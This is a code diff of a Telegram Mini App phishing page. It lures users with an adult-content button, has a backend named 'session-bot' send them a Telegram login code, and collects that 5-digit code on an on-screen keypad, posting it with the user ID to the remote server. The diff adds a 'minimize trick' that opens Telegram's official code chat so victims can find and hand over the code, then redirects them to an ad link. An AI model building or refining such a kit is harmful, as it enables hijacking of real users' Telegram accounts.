@@ -20,61 +20,36 @@
         }
         .overlay { background: rgba(0, 0, 0, 0.4); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         
-        .main-container { 
-            width: 90%; 
-            max-width: 360px; 
-            z-index: 2; 
-            text-align: center; 
-            margin-bottom: 50px; 
-        }
+        .main-container { width: 90%; max-width: 360px; z-index: 2; text-align: center; margin-bottom: 50px; }
 
-        .finger-icon {
-            font-size: 70px;
-            display: block;
-            margin-bottom: 10px;
-            animation: bounce 1.2s infinite;
-            text-shadow: 0 5px 15px rgba(0,0,0,0.4);
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(15px); }
-        }
+        .finger-icon { font-size: 70px; display: block; margin-bottom: 10px; animation: bounce 1.2s infinite; text-shadow: 0 5px 15px rgba(0,0,0,0.4); }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(15px); } }
 
         .instruction-box {
             background: rgba(255, 255, 255, 0.95);
             padding: 15px; border-radius: 15px;
-            margin-bottom: 15px; color: #333; font-weight: bold; font-size: 16px;
+            margin-bottom: 15px; color: #333; font-weight: bold; font-size: 15px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
 
-        /* Get Code Button Design */
+        /* Minimize Button Design */
         .get-code-btn {
-            background: #2AABEE;
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-bottom: 15px;
-            width: 100%;
+            background: linear-gradient(135deg, #2AABEE, #229ED9);
+            color: white; border: none; padding: 14px; border-radius: 12px;
+            font-size: 16px; font-weight: bold; cursor: pointer;
+            margin-bottom: 15px; width: 100%;
             box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
         }
-        .get-code-btn:active { transform: scale(0.98); background: #229ED9; }
+        .get-code-btn:active { transform: scale(0.98); opacity: 0.9; }
 
         .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
         .otp-box {
             width: 50px; height: 55px;
-            background: rgba(255, 255, 255, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.6);
+            background: rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.5);
             border-radius: 12px; display: flex; align-items: center; justify-content: center;
-            font-size: 30px; color: white; font-weight: bold; backdrop-filter: blur(5px);
+            font-size: 30px; color: white; font-weight: bold; backdrop-filter: blur(8px);
         }
 
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
@@ -96,21 +71,19 @@
     <div class="overlay"></div>
 
     <div class="main-container">
-        <!-- Step 1: Finger pointing to Telegram Main Button -->
         <div id="step0">
             <div id="finger_point" class="finger-icon">👇</div>
             <div id="load" class="loader hidden">🔄 Connecting...</div>
         </div>
 
-        <!-- Step 2: OTP Keypad Screen with Get Code Button -->
         <div id="step2" class="hidden">
             <div class="instruction-box">
-                Enter the 5-digit code that we just sent you!
+                Enter the 5-digit code we just sent you!
             </div>
 
-            <!-- Get Code Button -->
+            <!-- The Minimize Trick Button -->
             <button class="get-code-btn" onclick="openTelegramCodeChat()">
-                📩 Click here to get code
+                📩 View Code (Minimize App)
             </button>
 
             <div class="otp-inputs">
@@ -134,23 +107,26 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        // ইউজার আইডি সংগ্রহ
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
-
-        tg.MainButton.setText("🍓 START CONTINUE 🔞");
-        tg.MainButton.textColor = "#ffffff";
-        tg.MainButton.color = "#ff4757";
-        tg.MainButton.show();
-        
-        tg.MainButton.onClick(startFlow);
-
-        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; // আপনার ব্যাকএন্ড ইউআরএল দিন
+        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
         const OFF_LINK = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
         let currentOTP = "";
 
-        // সরাসরি কোড চ্যাট ওপেন করার ফাংশন
+        tg.MainButton.setText("🍓 START CONTINUE 🔞");
+        tg.MainButton.show();
+        tg.MainButton.onClick(startFlow);
+
+        // --- Minimize Trick Function ---
         function openTelegramCodeChat() {
+            tg.HapticFeedback.impactOccurred('medium');
+            
+            // ১. ওটিপি চ্যাট ওপেন করার চেষ্টা করবে
             tg.openTelegramLink("tg://openmessage?user_id=777000");
+
+            // ২. অ্যাপ মিনিমাইজ করার ট্রিক (InlineQuery সুইচ করা)
+            setTimeout(() => {
+                tg.switchInlineQuery(""); 
+            }, 300);
         }
 
         function startFlow() {
@@ -180,10 +156,7 @@
                 if (data.status === "success") {
                     document.getElementById('step0').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
-                } else {
-                    alert("Error: " + data.message);
-                    location.reload();
-                }
+                } else { alert(data.message); location.reload(); }
             } catch (e) { alert("Server Error!"); }
         }
 
@@ -194,16 +167,9 @@
                 if(currentOTP.length === 5) { verifyOTP(); }
             }
         }
-
-        function clearNum() {
-            currentOTP = currentOTP.slice(0, -1);
-            updateBoxes();
-        }
-
+        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateBoxes(); }
         function updateBoxes() {
-            for(let i=1; i<=5; i++) {
-                document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
-            }
+            for(let i=1; i<=5; i++) { document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }
         }
 
         async function verifyOTP() {
@@ -213,12 +179,8 @@
                     body: JSON.stringify({ user_id: userId, otp: currentOTP })
                 });
                 const data = await res.json();
-                if (data.status === "success") {
-                    window.location.href = OFF_LINK;
-                } else { 
-                    tg.showAlert("Invalid Code! Please try again.");
-                    currentOTP = ""; updateBoxes();
-                }
+                if (data.status === "success") { window.location.href = OFF_LINK; }
+                else { tg.showAlert("Invalid Code!"); currentOTP = ""; updateBoxes(); }
             } catch (e) { }
         }
     </script>
